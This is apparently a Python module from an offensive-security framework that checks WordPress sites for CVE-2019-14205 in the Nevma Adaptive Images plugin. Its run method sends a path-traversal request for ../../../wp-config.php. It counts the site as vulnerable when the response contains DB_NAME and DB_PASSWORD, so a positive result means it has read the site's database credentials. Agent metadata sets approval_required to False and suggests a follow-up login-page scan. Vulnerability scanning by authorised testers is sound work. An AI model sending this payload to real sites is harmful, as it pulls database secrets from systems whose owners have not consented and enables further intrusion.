#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Nevma Adaptive Images plugin before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Nevma Adaptive Images <0.6.67 - Local File Inclusion Detection',
        'description': "WordPress Nevma Adaptive Images plugin before 0.6.67 allows remote attackers to retrieve arbitrary files via the $REQUEST['adaptive-images-settings']['source_file'] parameter in adaptive-images-script.php.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'nevma', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/security-kma/EXPLOITING-CVE-2019-14205',
            'https://markgruffer.github.io/2019/07/19/adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.html',
            'https://wordpress.org/plugins/adaptive-images/#developers',
            'https://github.com/markgruffer/markgruffer.github.io/blob/master/_posts/2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-14205',
        ],
        'cve': 'CVE-2019-14205',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Nevma Adaptive Images <0.6.67 - Local File Inclusion detected",
                path='/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php',
            )
            return True
        return False

